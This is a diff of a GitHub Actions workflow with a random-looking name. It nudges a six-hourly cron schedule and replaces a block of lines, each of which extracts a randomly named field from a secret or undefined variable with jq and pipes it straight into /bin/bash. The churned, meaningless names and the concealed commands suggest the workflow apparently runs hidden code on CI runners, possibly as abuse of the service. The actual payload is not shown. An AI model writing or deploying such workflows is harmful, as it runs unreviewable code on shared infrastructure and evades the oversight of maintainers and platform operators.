@@ -3,7 +3,7 @@ name: mingyulu1837
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 2/6 * * *'
+    - cron: '23 2/6 * * *'
 
 jobs:
   build:
@@ -12,17 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: mingyulu1837
         env:
-          n2: ${{ secrets.n2 }}
+          zw5248: ${{ secrets.zw5248 }}
         run: |
-          echo $n2 | jq -r .jp87419 | /bin/bash
-          echo $mtkx52691 | jq -r .nop5001 | /bin/bash
-          echo $qwvun3 | jq -r .wt64 | /bin/bash
-          echo $ei9969 | jq -r .dgcsq1464 | /bin/bash
-          echo $k3635 | jq -r .vtoyt75 | /bin/bash
-          echo $uyyd83 | jq -r .drhlz3266 | /bin/bash
-          echo $piz3998 | jq -r .nqv2 | /bin/bash
-          echo $nu7901 | jq -r .qhg73892 | /bin/bash
-          echo $jeqc69 | jq -r .cgw4 | /bin/bash
-          echo $z1 | jq -r .i462 | /bin/bash
-          echo $f35 | jq -r .u5 | /bin/bash
+          echo $zw5248 | jq -r .h8 | /bin/bash
+          echo $vbz93 | jq -r .fkljv00 | /bin/bash
+          echo $pr56 | jq -r .ymb278 | /bin/bash
+          echo $l438 | jq -r .axg76 | /bin/bash
+          echo $e3 | jq -r .dm71340 | /bin/bash
+          echo $orkf95964 | jq -r .razq95523 | /bin/bash
+          echo $f7 | jq -r .ax7 | /bin/bash
+          echo $mmhhk955 | jq -r .hd50 | /bin/bash
+          echo $ifao3 | jq -r .wd60 | /bin/bash
 
